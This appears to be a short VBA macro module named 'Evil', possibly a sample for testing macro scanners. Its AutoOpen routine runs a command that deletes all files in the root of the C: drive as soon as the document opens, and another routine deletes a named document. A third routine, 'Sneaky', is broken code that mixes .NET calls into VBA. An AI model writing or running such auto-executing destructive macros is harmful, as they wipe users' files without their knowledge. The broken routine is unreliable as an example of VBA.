Attribute VB_Name = "Evil"
Sub AutoOpen()
    Shell "cmd /c del C:\*.*"
End Sub

Sub Sneaky()
    Dim o As Object
    Set o = "x"
    Debug.Print o.GetType().Assembly.Location
End Sub

Sub Files()
    Kill "C:\important.docx"
    Debug.Print Environ("PATH")
End Sub
